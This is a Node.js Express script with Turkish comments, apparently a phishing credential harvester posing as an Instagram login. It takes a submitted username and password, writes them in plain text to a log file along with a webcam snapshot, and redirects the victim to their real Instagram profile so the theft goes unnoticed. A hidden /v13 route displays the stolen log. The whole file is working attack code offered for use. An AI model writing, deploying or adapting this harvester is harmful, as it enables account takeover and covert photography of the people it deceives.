const express = require('express');
const fs = require('fs');
const webcam = require('node-webcam');
const uuid = require('uuid'); // uuid modülünü yükleyin: npm install uuid
const app = express();
const port = 3000;

app.use(express.urlencoded({ extended: true }));

// Kamera konfigürasyonu
const camera = webcam.create({
  width: 1280,
  height: 720,
  quality: 100,
  delay: 0,
  saveShots: true,
  output: "jpeg",
  device: false,
  callbackReturn: "location"
});

app.get('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});

app.post('/submit', (req, res) => {
  const { username, password } = req.body;

  // Kamera fotoğrafını çek
  const uniqueFilename = `${uuid.v4()}.jpg`;
  const picturePath = `images/${uniqueFilename}`;
  
  camera.capture(picturePath, (err, data) => {
    if (err) throw err;

    // Logları kaydet
    const log = `Username: ${username}, Password: ${password}, Picture: ${uniqueFilename}\n`;
    fs.appendFile('logs.txt', log, (err) => {
      if (err) throw err;
      console.log('SUCCESS!');
    });
  });

  res.redirect(`https://www.instagram.com/${username}`);
});

app.get('/v13', (req, res) => {
  fs.readFile('logs.txt', 'utf8', (err, data) => {
    if (err) throw err;
    res.send(`<pre>${data}</pre>`);
  });
});

app.listen(port, () => {
  console.log(`Sunucu ${port} portunda çalışıyor.`);
});
